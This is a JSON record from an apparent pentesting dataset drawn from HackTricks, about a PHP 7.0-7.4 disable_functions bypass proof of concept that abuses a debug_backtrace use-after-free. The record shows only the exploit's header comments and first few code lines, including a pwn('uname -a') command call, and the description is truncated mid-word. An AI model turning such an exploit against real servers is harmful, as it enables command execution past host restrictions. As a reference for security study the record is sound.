{
  "id": "network_services_pentesting_c76257b1f814",
  "category": "network-services-pentesting",
  "title": "disable functions bypass php 7.0 7.4 nix only",
  "description": "# disable_functions bypass - PHP 7.0-7.4 (\\*nix only)\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n## PHP 7.0-7.4 (\\*nix only)\n\nFrom [https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable\n# that has been dest",
  "payloads": [
    "# disable_functions bypass - PHP 7.0-7.4 (\\*nix only)",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "## PHP 7.0-7.4 (\\*nix only)",
    "From [https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)",
    "```php",
    "# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)",
    "# Bug: https://bugs.php.net/bug.php?id=76047",
    "# debug_backtrace() returns a reference to a variable",
    "# that has been destroyed, causing a UAF vulnerability.",
    "# This exploit should work on all PHP 7.0-7.4 versions",
    "# released as of 30/01/2020.",
    "# Author: https://github.com/mm0r1",
    "pwn(\"uname -a\");",
    "function pwn($cmd) {",
    "global $abc, $helper, $backtrace;"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only.md"
  ]
}